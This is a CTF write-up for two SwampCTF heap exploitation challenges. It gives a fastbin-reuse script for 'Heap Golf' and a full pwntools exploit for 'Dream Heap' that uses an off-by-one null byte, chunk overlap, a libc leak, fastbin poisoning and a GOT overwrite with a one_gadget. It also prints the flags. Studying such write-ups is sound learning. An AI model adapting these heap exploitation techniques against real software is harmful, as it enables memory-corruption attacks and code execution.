## Heap Golf

So, we want to execute the following path of code
```
if ( *(_DWORD *)init_pointer == 4 )
      win_func();
```

but the init_pointer is definied as below:
```
  init_pointer = malloc(0x20uLL);               [1]
  write(0, "target green provisioned.\n", 0x1AuLL);
  ptr = init_pointer;
  v6 = 1;
  write(0, "enter -1 to exit simulation, -2 to free course.\n", 0x30uLL);
  while ( 1 )
  {
    write(0, "Size of green to provision: ", 0x1CuLL);
    read(1, &buf, 4uLL);
    size_or_choice = atoi(&buf);
    if ( size_or_choice == -1 )         // exit path
      break;
    if ( size_or_choice == -2 )          
    {
      for ( i = 0; i < v6; ++i )
        free(*(&ptr + i));                     [3]
      ptr = malloc(0x20uLL);                   [4]
      write(0, "target green provisioned.\n", 0x1AuLL);
      v6 = 1;
    }
    else          // if we inserted value different from -1 or -2
    {
      v3 = malloc(size_or_choice); 
      *(_DWORD *)v3 = v6;             [2]
      *(&ptr + v6++) = v3;
```

 - So we know that init_pointer is in fastbin [1] , and init_pointer[0]=1 from the beginning [2]
 - The fastbins is empty, and because of that every time we'll malloc, we'll get the top chunk splitted
 - As shown in [3], we can free all the chunk's previously allocated, then another malloc(0x20) in fastbin will happen

### Solution
To execute the win_func() we need first to allocate 4 chunk of the same size of init_pointer,or at least the last 
e.g. [init_ptr| A | B | C | D ]

This is done because, when we'll freed them all [3], in [4] ptr will point to D chunk,
because the free function puts in a lifo the fastchunk, and never consolidate with the top chunk, 
so the fastbin[32] will point to  C|fd -> B|fd -> A|fd -> init_ptr|null.

Now if we allocate again 4 chunk of the same size of init_pointer we should have the job done

```
  #!/usr/bin/env python2
  import sys, socket, telnetlib
  from struct import *

  def recvuntil(t):
      data = ''
      while not data.endswith(t):
          tmp = s.recv(1)
          if not tmp: break
          data += tmp

      return data

  def interactive():
      t = telnetlib.Telnet()
      t.sock = s
      t.interact()

  def sendline(data):
    s.send(data + "\n")

  def p32(x): return pack('<I', x)
  def u32(x): return unpack('<I', x)[0]
  def p64(x): return pack('<Q', x)
  def u64(x): return unpack('<Q', x)[0]

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((sys.argv[1], int(sys.argv[2])))

  for x in list(range(4)):
    recvuntil("green to provision:")
    sendline(str(32))

  recvuntil("green to provision:")
  sendline("-2")

  for x in list(range(4)):
    recvuntil("green to provision:")
    sendline(str(32))

  #fastbin use fifo, so next time will return the chunk pointed by v9
  # so we can now execute:  if ( *(_DWORD *)v9 == 4 ) win_func();
  interactive() #flag{Gr34t_J0b_t0ur1ng_0ur_d1gi7al_L1nk5}
  s.close()
```

## Dream Heap

We have the following action permitted:

- Write dream: we have global var in bss that contains the dreams and another global var in bss just below the precedent that contains the size 
    of the dream 
   ``` 
    puts("How long is your dream?");
    __isoc99_scanf("%d", &v1);
    buf = malloc(v1);
    puts("What are the contents of this dream?");
    read(0, buf, v1);
    HEAP_PTRS[INDEX] = (__int64)buf;
    SIZES[INDEX++] = v1;
   ```
   there's no limit on how much dream we can make, and every dream is treated as a char * and so we can insert something in.

- Read dream: read the content of  a dream 
  
- Edit dream: change the content of  dream

- Delete dream: delete a dream and set his pointer to null

- Exit

The vulnerability arises in the edit dream function, that permits us to set a null byte just after the content we inserted 
  ```
    if ( v1 <= INDEX )
    {
      buf = (void *)HEAP_PTRS[v1];
      v2 = SIZES[v1];
      read(0, buf, v2);
      *((_BYTE *)buf + v2) = 0;
    }
  ```

### Solution
We can set to null the least significat byte of the next chunk, decreasing his size.
Then we can shrink a chunk and get a chunk twice, one in unsorted bin the other in smallbin/fastbin.

We choosed to craft a fake chunk and the insert it in the fastbin, so after we could apply fastbin
corrupt and insert the following chunk: 0x601ffa

More info on the commented code below.

```
from pwn import *
import time

debug = int(sys.argv[1])
online = False

if( debug == 0):
  online = True
  r = remote("chal1.swampctf.com", 1070)
  libcz = ELF("./libc6.so")
elif(debug == 1):
  libcz = ELF("/lib/x86_64-linux-gnu/libc.so.6")
  mainz = ELF("./dream_heaps")
  r = mainz.process()
  if(debug == 2):
    gdb.attach(r, """source ./script.py""")
  
def halt():
  while True:
    log.info( r.recvline() )

def write(size, data):
  r.recvuntil("> ")
  r.sendline("1")
  r.recvuntil("How long is your dream?")
  r.sendline(str(size))
  r.recvuntil("the contents of this dream?")
  r.send(data)

def read(index):
  r.recvuntil("> ")
  r.sendline("2")
  r.recvuntil("you like to read?")
  r.sendline(str(index))

def edit(index, data):
  r.recvuntil("> ")
  r.sendline("3")
  r.recvuntil("you like to change?")
  r.sendline(str(index))
  r.send(data)

def delete(index):
  r.recvuntil("> ")
  r.sendline("4")
  r.recvuntil("would you like to delete?") 
  r.sendline(str(index))

def interactive():
  if not online:
    print( """/usr/bin/gdb -q  {0} {1}""".format( r.argv[0], r.pid ) )
  r.interactive()

def exploit():
  write(0x108, "A"*0x108) #chunk size 0x110
  write(0x200, "B"*0x200) #chunk size 0x210
  write(0x108, "C"*0x108) #chunk size 0x110
  write(0x90, "barrier\n") #no top chunk consolidate after

  #there's check 'chunksize(P) != prev_size (next_chunk(P))' 
  edit(1, "B"*0x1f0 + p64(0x200) )
  delete(1) 
  edit(0, "A"*0x108) 
  #now chunk "B" is 0x200 as size and not any more 0x210 but the C chunk still has in previous size 0x210

  write(0x80, "1"*0x80) 
  write(0x80, "2"*0x80)
  delete(4) #chunk "1"
  delete(2) #chunk "C"
  
  #now consolidate should happen and in unsorted bin a block of 0x320 is there 
  #and we have still a pointer that we can use to leak or to corrupt
  write(0x320 - 0x8, "\x0a" )

  #libc leak (we loosed also 1 byte not a problem)
  read(6)
  r.recvline(); r.recvline()#empty
  leak_1=u64( ("\x00"+r.recvline()).split("What")[0].ljust(8, "\x00"))
  log.info( "libc leak 0x{0:x}".format(leak_1))
  libcBase = leak_1 - 3823104 
  if online:
    libcBase = leak_1 - 3951360 #we get this offset after leak and then some delete to generate a core dumps
  log.info( "libc base address 0x{0:x}".format(libcBase))

  #we found that we can use fastbin corrupt .. so  fake chunk craft
  #pwndbg> x/60gx 0x0601ffa
  #0x601ffa: 0x1e28000000000000  0xf1b0000000000060
  edit(6, "1"*(0x88 + 0x8) + "2"*0x58 + p64(0x21))
  edit(6, "1"*0x88 + p64(0x61)) 
  delete(5) #chunk "2" fastbin approved

  #so how we overwrite now? 
  onegadget= libcBase + 0xd6e77
  if online:
    onegadget = libcBase +0xf1147
  log.info( "one gadget base address 0x{0:x}".format(onegadget))

  fake_chunk = 0x601ffa
  edit(6, "1"*(0x88 + 0x8) + p64(fake_chunk)) 
  edit(6, "1"*0x88 + p64(0x61)) 
  write(0x60 - 0x8, "a")

  if online: 
    write(0x60 - 0x8, "A"*8 + "A"*5 +" ")
  else:
    write(0x60 - 0x8, "A"*8 + "A"*6 +" ")

  read(8)
  r.recvline() #empty
  leak_2=u64( r.recvline().split(" ")[1].split("What")[0].ljust(8,"\x00") )
  log.info( "another leak 0x{0:x}".format(leak_2))
  #Lol .. this is the real leak.. now get it done right..
  free_got= 0x0844f0
  libcBase= leak_2 - free_got
  log.info( "the real libc.. forgot the arena address need to be scaled,whatever that is: 0x{0:x}".format(libcBase))
  
  puts = libcBase + 0x000000000006f690
  stack_chk_fail = libcBase + 0x00000000001190f0
  main = 0x400A88                           #0x48
  edit(8, "A"*8 + "A"*6 + p64(main) + p64(puts) + p64(stack_chk_fail) + p64(onegadget))
   
  interactive() #now run the free
  #$ cat flag.txt
  #flag{d0nt_bE_nu11_b3_dul1} 
  #Just lol.... we used the old libc for onegadget and still it workss.. this is strange xD

exploit()
```



